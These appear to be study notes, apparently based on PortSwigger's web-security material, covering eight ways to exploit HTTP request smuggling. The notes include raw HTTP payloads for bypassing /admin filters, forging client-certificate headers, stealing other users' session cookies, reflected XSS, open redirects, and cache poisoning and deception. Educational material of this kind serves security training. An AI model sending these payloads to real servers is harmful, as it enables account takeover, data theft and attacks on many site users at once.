
# Exploiting HTTP Request Smuggling
[Portswigger](https://portswigger.net/web-security/request-smuggling/exploiting)

## 📌 Overview

Once a system is vulnerable to **HTTP Request Smuggling (HRS)**, attackers can chain it into multiple **exploitation paths**:

- Bypassing security controls.
    
- Revealing hidden headers.
    
- Abusing authentication mechanisms.
    
- Capturing other users’ requests.
    
- Delivering XSS payloads.
    
- Turning redirects into open redirects.
    
- Performing cache poisoning or cache deception.
    

The impact ranges from **privilege escalation** to **full compromise of user sessions**.

---
## 1️. Bypass Front-End Security Controls

### 💡 Why It Works

- Front-end applies **access control filtering** (e.g., blocks `/admin`).
    
- Back-end **trusts front-end decisions** and doesn’t re-check.
    
- A smuggled request to `/admin` **bypasses the filter**.
    

### 🧪 Payload Example

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

🔎 **Front-end sees:** two requests to `/home`.  
🔎 **Back-end sees:** `/home` + `/admin`.

Result → Attacker gains unauthorized access to `/admin`.

---

## 2️. Reveal Front-End Request Rewriting

### 💡 Why It Works

- Proxies often rewrite requests:
    
    - Add **TLS info** (`X-TLS-Version`, `X-TLS-Cipher`).
        
    - Add **IP headers** (`X-Forwarded-For`).
        
    - Add **user/session headers**.
        
- Smuggling lets you **reflect rewritten request into a parameter**, exposing hidden headers.
    

### 🧪 Steps

1. Find a parameter that is **reflected in response**.
    
2. Put this parameter **last** in request body.
    
3. Smuggle another request after it.
    

### 🧪 Payload Example

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
```

Result → Reflected response leaks headers like:

```http
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Version: TLSv1.2
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
```

⚠️ **Note:**  
Set `Content-Length` in smuggled request slightly larger than actual body. Increase step by step until full rewritten request is captured.

---

## 3. Bypass Client Authentication

### 💡 Why It Works

- In mutual TLS, **client CN** (Common Name) is passed in hidden headers (e.g., `X-SSL-CLIENT-CN`).
    
- Normally, front-end overwrites them if supplied.
    
- Smuggled requests **bypass front-end rewriting**, sending **arbitrary headers** straight to back-end.
    

### 🧪 Payload Example

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

Result → Attacker gains admin-level access.

---

## 4. Capture Other Users’ Requests

### 💡 Why It Works

- Smuggled request with **overlong Content-Length** causes back-end to “borrow” bytes from next request.
    
- Victim’s request body gets appended into attacker’s parameter (e.g., `comment`).
    

### 🧪 Payload Example

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=attacker-session

csrf=abc123&postId=2&name=Attacker&comment=
```

Result → Victim’s next request (`Cookie: session=...`) is appended into attacker’s comment field → attacker steals session tokens.

⚠️ Limitation: Data capture often stops at first **parameter delimiter (&)** in victim’s request.

---

## 5. Deliver Reflected XSS

### 💡 Why It Works

- If app is vulnerable to **reflected XSS** in headers (e.g., `User-Agent`), attackers can inject payloads that will be reflected back **into the next user’s response**.
    
- Unlike normal XSS, **no user interaction required**.
    

### 🧪 Payload Example

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

Result → Next user receives reflected XSS payload.

---

## 6. Turn Redirects into Open Redirects

### 💡 Why It Works

- Some apps auto-redirect based on `Host` header.
    
- Smuggled request changes `Host`, producing **off-site redirect**.
    

### 🧪 Payload Example

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

Result → Redirect points to `attacker-website.com/home`.

🔁 Variants:

- **Root-relative redirect abuse**:
```HTTP
GET //attacker.com/example HTTP/1.1
Host: vulnerable-website.com
```
    → `Location: //attacker.com/example/`
   

---

## 7. Web Cache Poisoning

### 💡 Why It Works

- Front-end cache stores response under **wrong URL key** (due to smuggled request).
    
- Poisoned cache serves malicious redirect to all future visitors.
    

### 🧪 Payload Example

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

Result → Cache for `/static/include.js` now contains redirect to attacker’s site.

---

## 8️. Web Cache Deception

### 💡 Why It Works

- Instead of storing malicious content, attacker forces cache to **store private content** from a victim’s session.
    
- Attacker later retrieves this sensitive content from the cache.
    

### 🧪 Payload Example

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

Next victim request:

```http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=VictimSession
```

Result → Victim’s **private messages cached** under `/static/some-image.png`. Attacker retrieves them.

⚠️ Caveat: Attacker may not know exact cache key → may need to brute-force static URLs.

---

## 🧠 Key Takeaways

- Exploitation paths depend on **app behavior + front-end rewrites + caching layers**.
    
- Smuggling can escalate into:
    
    - **Bypassing ACLs / Authentication**
        
    - **Stealing sessions**
        
    - **XSS delivery**
        
    - **Redirects & Cache poisoning/deception**
        
- Cache-based attacks = **persistent** and can affect many users at once.
    